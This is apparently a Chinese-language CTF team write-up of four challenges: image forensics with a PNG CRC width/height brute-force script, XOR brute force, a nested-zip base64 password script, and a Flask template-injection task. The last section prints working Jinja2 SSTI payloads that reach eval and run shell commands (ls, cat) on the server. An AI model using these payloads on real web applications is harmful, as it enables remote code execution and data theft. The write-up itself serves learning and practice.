### 排名
![](https://cdn.nlark.com/yuque/0/2025/png/49267415/1737894318272-8a71ac3b-1dcb-46f6-89c6-ec418f125684.png)

### See anything in these pics? | Misc | 26
附件中一个png文件和一个zip文件

打开png文件，是一张阿兹特克码，用在线网站[在线阅读Aztec条码](https://products.aspose.app/barcode/zh-hans/recognize/aztec#google_vignette)识别，得到一串字符

![](https://cdn.nlark.com/yuque/0/2025/png/49267415/1737082852181-625aa340-362d-4088-b8b1-01e2432fd666.png)

打开压缩文件，需要密码，我们猜测阿兹特克码识别出的字符串就是压缩包密码，尝试解压，发现密码正确

解压后得到了一张jpg文件，打开查看没有获得任何信息，用16进制编辑器010Editor打开查看

文件头没有异常，但是文件结尾的IEDN并不是jpg文件的文件尾而是png文件的文件尾，于是查找jpg文件尾FFD9

FFD9后紧跟着的就是89504E47，即png文件的文件头

将FFD9后的字节全部剪切到一个新建的十六进制文件中，以png格式保存，得到了一张png图片，但是图中还是没有任何信息

在kali系统中打开我们发现了CRC报错，于是用python脚本进行宽高爆破

```python
import zlib
import struct
import argparse
import itertools


parser = argparse.ArgumentParser()
parser.add_argument("-f", type=str, default=None, required=True,
                    help="输入同级目录下图片的名称")
args  = parser.parse_args()


bin_data = open(args.f, 'rb').read()
crc32key = zlib.crc32(bin_data[12:29]) 
original_crc32 = int(bin_data[29:33].hex(), 16) 


if crc32key == original_crc32: 
    print('宽高没有问题!')
else:
    input_ = input("宽高被改了, 是否CRC爆破宽高? (Y/n):")
    if input_ not in ["Y", "y", ""]:
        exit()
    else: 
        for i, j in itertools.product(range(4095), range(4095)): 
            data = bin_data[12:16] + struct.pack('>i', i) + struct.pack('>i', j) + bin_data[24:29]
            crc32 = zlib.crc32(data)
            if(crc32 == original_crc32): 
                print(f"\nCRC32: {hex(original_crc32)}")
                print(f"宽度: {i}, hex: {hex(i)}")
                print(f"高度: {j}, hex: {hex(j)}")
                exit(0)
```

运行脚本后得到了正确的宽高

在010Editor中修改图片宽高后，图片中出现了flag：flag{opium_00pium}

### 简单算术 | Misc | 12
附件的文本文件中只有一行字符串，根据提示异或我们猜测这段字符串解密后得到的应该就是flag

先猜测密钥为单字符密钥，由于数量较多所以直接用代码遍历所有单字符解密

```python
def xor_decrypt(ciphertext, key):
    return ''.join(chr(c ^ key) for c in ciphertext)

ascii_ciphertext = []
ciphertext = input("请输入密文：")
for i in ciphertext :
	ascii_ciphertext.append(ord(i))

for key in range(256):
    decrypted = xor_decrypt(ascii_ciphertext, key)
    print(f"Key: {key:02x} | Decrypted: {decrypted}")
```

运行结果如下

![](https://cdn.nlark.com/yuque/0/2025/png/49267415/1737108498268-074c2cd8-7bc1-4907-a008-d462339e448c.png)

得到flag：flag{x0r_Brute_is_easy!}

### 压力大，写个脚本吧 | Misc | 29
根据题目提示以及附件的压缩包，猜测应该是100个压缩包套娃

解压文件，发现需要密码，用010Editor查看并不是伪加密，于是用txt文件中的字符串作为密码直接解压，但发现并不是密码

由于txt文本内容的重复性，于是打算截取其中一段作为密码，但是无果

由于base64编码在CTF赛题中运用较为广泛，我们猜测这可能是base64编码，于是将其解码，解码结果作为压缩包密码尝试解压，发现成功了

继续往下尝试了两个压缩包，发现都是一样，txt文件中的字符串经过base64解码后作为密码解压压缩包

有了思路，我们开始编写脚本

```python
from base64 import b64decode
from zipfile import ZipFile

def zipfile_extract(password, zipname):
    dc_password = b64decode(password)
    with ZipFile(zipname, 'r') as zip_ref:
        zip_ref.setpassword(dc_password)
        zip_ref.extractall()

def main():
    for i in range(99, -1, -1):
        textname = 'password_{}.txt'.format(i)
        zipname = 'zip_{}.zip'.format(i)
        with open(textname, "r") as f:
            password = f.read().strip()  
        zipfile_extract(password, zipname)

if __name__ == "__main__":
    main()
```

成功把所有压缩包解压，得到了flag-hint.txt，根据hint，猜测每个压缩包的密码都是png文件的十六进制的一部分

将password_0.txt文本中的字符串进行base64解码，得到的字符串开头为89504E47，是png文件的文件头，证实了我们的猜想

接下来只要将password_0.txt到password_99.txt中的字符串进行base64编码后连接起来就能得到png文件的16进制，我们继续编写脚本完成这一过程

```python
from base64 import b64decode

s = b'' 

for i in range(0,100):
    textname = 'password_{}.txt'.format(i)
    with open(textname, "r") as f:
        password = f.read().strip()  
    s += b64decode(password)  

print(s)
```

运行结果如下

![](https://cdn.nlark.com/yuque/0/2025/png/49267415/1737109604474-fff78f37-843b-4ffe-aed5-2a52b6a0771f.png)

将字符串粘贴到16进制文件中，以png格式保存，得到一张QR码

用[在线阅读QR Code条码](https://products.aspose.app/barcode/zh-hans/recognize/qr#)网站识别QR码得到flag：flag{_PASSWORDs_is_fl@g!_}

![](https://cdn.nlark.com/yuque/0/2025/png/49267415/1737109754047-75182601-db8a-498d-a37e-c7963335f8d8.png)

### easy_flask | Web | 14
根据提示，应该是考察flask模板注入

根据一篇blog[[BUUOJ记录] [RootersCTF2019] I_<3_Flask - Ye’sBlog - 博客园](https://www.cnblogs.com/yesec/p/14905799.html)的提示，注意到其url

![](https://cdn.nlark.com/yuque/0/2025/png/49267415/1737110143997-b1db66cf-4aa6-4d85-b6c8-db7a230fb09e.png)

不过我们已知参数user是可用的，直接使用jinja2模板

构造请求

/?user={%%20for%20c%20in%20[].**class**.**base**.**subclasses**()%20%}%20{%%20if%20c.**name**%20<font style="background-color:#f3bb2f;">%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.</font>**<font style="background-color:#f3bb2f;">init</font>**<font style="background-color:#f3bb2f;">.</font>**<font style="background-color:#f3bb2f;">globals</font>**<font style="background-color:#f3bb2f;">.values()%20%}%20{%%20if%20b.</font>**<font style="background-color:#f3bb2f;">class</font>**<font style="background-color:#f3bb2f;">%20</font>%20{}.**class**%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__("os").popen("ls").read()%27)%20}}%20{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}

得到了文件列表

![](https://cdn.nlark.com/yuque/0/2025/png/49267415/1737110629491-68faec67-243b-41f1-800b-446ba8ad31cd.png)

找到了flag文件，直接cat

/?user={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__("os").popen("cat%20flag%20reqirement.txt").read()%27)%20}}%20{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49267415/1737110747354-66467c65-9228-4eed-8fcf-87b893ad8de3.png)



